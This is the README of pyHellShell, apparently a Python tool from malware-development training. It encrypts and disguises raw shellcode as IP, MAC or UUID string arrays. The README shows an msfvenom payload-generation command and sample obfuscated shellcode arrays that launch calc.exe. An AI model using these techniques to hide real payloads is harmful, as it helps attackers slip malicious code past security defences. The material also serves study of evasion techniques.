# pyHellShell

pyHellShell is a python implementation of the tool [HellShell](https://github.dev/NUL0x4C/HellShell). pyHellShell takes in a raw payload file and processes it with encryption and obfuscation. Currently, pyHellShell supports 3 types of encryption and 4 types of obfuscation. 

## Feature 

**Encryption**
- xor
- rc4
- aes256

**Obfuscation** 
- ipv4
- ipv6
- mac
- uuid 

**Output Format**
- C: Can be directly used in C or CPP projects 
- Raw: Saves output to a file 

## Usage 

```bash
usage: pyHellShell.py [-h] -i INPUT [-e {xor,rc4,aes256}] [-k KEY] [-o {ipv4,ipv6,mac,uuid}] [-f {c,raw}] [-out OUTPUT]

PyHellShell: A tool for file encryption and obfuscation.

options:
  -h, --help            show this help message and exit
  -i INPUT, --input INPUT
                        Path to the input file.
  -e {xor,rc4,aes256}, --encryption {xor,rc4,aes256}
                        Encryption method.
  -k KEY, --key KEY     Encryption key.
  -o {ipv4,ipv6,mac,uuid}, --obfuscation {ipv4,ipv6,mac,uuid}
                        Obfuscation method.
  -f {c,raw}, --format {c,raw}
                        Output format (C array or raw text file).
  -out OUTPUT, --output OUTPUT
                        Path to the output file.
```

## Examples 

#### Payload Creation 
```bash
msfvenom -p windows/x64/exec cmd=calc.exe -f raw -o calc.bin 
```

#### Encryption + Obfuscation, stdout with C Array 
```bash
└─$ python3 pyHellShell.py -i calc.bin -e xor -k testo -o ipv4     

[i] Input file          : calc.bin
[i] Encryption method   : xor
[i] Obfuscation method  : uuid
[i] Output format       : c
[i] Output file         : None

char* buf[] = {
        "90f02d88-9c9f-73a5-746f-353432243d25", "bd453b33-2d11-26f8-0f3c-ee216c27ff37", "06e43c53-3b35-d87b-3e2f-3e45a63c54b3", "191553d8-5871-354f-a4ba-792e75a49199", 
        "3b34353d-3dff-ee54-3148-2775b5f8f4e7", "3c736574-b4ea-1411-3c6e-a435f83c7730", "265433ee-b575-2290-278b-ac32ff5bfc2d", "4522a272-3bac-af45-d824-b2bd623564b2", 
        "94018f4c-773f-5023-6d36-4dbe01bd2b30", "3a4134e4-bf75-2412-f878-2730ee336826", "ff32b575-fc6b-722d-a42e-2c242b2a362e", "36352b24-3f35-f73b-8354-24218b8f2c24", 
        "ff272e2a-9a77-9023-8b9a-2e3cd5756573", "65746f74-3c73-f9e2-6472-746f35df42ff", "a69af300-9fcf-c7c1-2535-d5d2f0cee990", "b0f02da1-4847-0f63-7eef-8f850671d433", 
        "051b0176-3c74-fd32-b58b-b0101503171f", "0c0a5a09-7300-0000-0000-000000000000"
};

#define NumberOfElements 18
#define PayloadSize 27
```

#### Encryption + Obfuscation + save to file 
```bash
└─$ python3 pyHellShell.py -i calc.bin -e rc4 -k testo -o mac -f raw -out calc.rc4.mac.bin

[i] Input file          : calc.bin
[i] Encryption method   : rc4
[i] Obfuscation method  : mac
[i] Output format       : raw
[i] Output file         : calc.rc4.mac.bin

[+] Saved to file: calc.rc4.mac.bin

#define PayloadSize 278

└─$ cat calc.rc4.mac.bin                
fc:ce:98:c3:0c:8b,13:60:02:bc:76:8e,e8:66:6d:ce:5d:3c,05:cb:08:20:c7:a2,c0:16:e8:80:9d:e4,c5:e0:80:55:f0:9b,74:de:ec:b4:fb:18,bd:69:01:4a:ae:77,1b:26:aa:5a:bc:01,32:41:d3:12:bc:fb,5a:c1:a1:38:d0:f8,cf:7c:6a:8b:25:73,88:54:dc:2c:df:84,f1:3f:1c:c6:5b:8b,c5:fa:49:62:a8:f8,2d:53:84:eb:bc:0a,5b:51:3c:d1:c0:f6,1f:ad:7d:f1:23:06,a8:e0:ee:45:9e:63,76:b4:65:08:c9:fe,0b:e0:ff:62:88:aa,38:9e:f9:d4:9f:87,64:6e:42:76:7a:13,d6:c2:46:04:a2:34,71:11:54:41:4c:42,2d:4c:31:4d:07:0f,3f:2c:cb:de:02:3b,bf:ba:90:e4:be:85,fc:d7:f0:2e:c1:0c,17:02:09:a5:47:8d,93:e5:74:e2:39:92,bc:db:4a:73:47:42,9f:4a:78:0a:96:30,41:05:b2:ce:0c:7d,cd:89:09:a3:df:d8,ba:40:36:a4:5f:7b,8c:1c:19:a0:de:8c,da:46:2d:f2:44:0f,17:04:86:bb:b2:c1,43:8b:8e:33:40:76,a0:3d:a0:27:a6:45,f6:79:2b:1a:df:b7,64:80:3a:5b:9a:6d,d7:55:8d:71:7b:c5,c0:1f:8d:d7:06:62,96:09:85:42:60:74,6b:f7:00:00:00:00
```

#### Only Obfuscation + save to file 
```bash

└─$ python3 pyHellShell.py -i calc.bin -o ipv4 -f c     

[i] Input file          : calc.bin
[i] Encryption method   : None
[i] Obfuscation method  : ipv4
[i] Output format       : c
[i] Output file         : None

char* buf[] = {
        "252.72.131.228", "240.232.192.0", "0.0.65.81", "65.80.82.81", "86.72.49.210", "101.72.139.82", "96.72.139.82", "24.72.139.82", 
        "32.72.139.114", "80.72.15.183", "74.74.77.49", "201.72.49.192", "172.60.97.124", "2.44.32.65", "193.201.13.65", "1.193.226.237", 
        "82.65.81.72", "139.82.32.139", "66.60.72.1", "208.139.128.136", "0.0.0.72", "133.192.116.103", "72.1.208.80", "139.72.24.68", 
        "139.64.32.73", "1.208.227.86", "72.255.201.65", "139.52.136.72", "1.214.77.49", "201.72.49.192", "172.65.193.201", "13.65.1.193", 
        "56.224.117.241", "76.3.76.36", "8.69.57.209", "117.216.88.68", "139.64.36.73", "1.208.102.65", "139.12.72.68", "139.64.28.73", 
        "1.208.65.139", "4.136.72.1", "208.65.88.65", "88.94.89.90", "65.88.65.89", "65.90.72.131", "236.32.65.82", "255.224.88.65", 
        "89.90.72.139", "18.233.87.255", "255.255.93.72", "186.1.0.0", "0.0.0.0", "0.72.141.141", "1.1.0.0", "65.186.49.139", 
        "111.135.255.213", "187.240.181.162", "86.65.186.166", "149.189.157.255", "213.72.131.196", "40.60.6.124", "10.128.251.224", "117.5.187.71", 
        "19.114.111.106", "0.89.65.137", "218.255.213.99", "97.108.99.122", "122.46.101.120", "101.0.0.0"
};

#define NumberOfElements 70
#define PayloadSize 278

```




## Credits 

- [HellShell](https://github.dev/NUL0x4C/HellShell)
- MiniShell from Maldev Academy 
- [Maldev Academy](https://maldevacademy.com/): pyHellShell was created while going through the payload obfuscation modules in maldev academy. 